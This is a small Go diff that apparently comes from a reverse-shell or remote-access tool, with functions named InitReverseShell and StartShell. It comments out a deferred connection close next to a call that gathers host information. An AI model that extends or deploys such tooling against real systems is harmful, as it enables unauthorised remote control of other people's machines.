@@ -47,7 +47,7 @@ func InitReverseShell(connectString string, fingerprint []byte) {
 
 func StartShell(conn *myconn.Writer) {
 	sh := NewIShell(conn)
-	defer myconn.Conn.Close()
+	// defer myconn.Conn.Close()
 	defer sh.Close()
 
 	host, _ := sitrep.HostInfo()
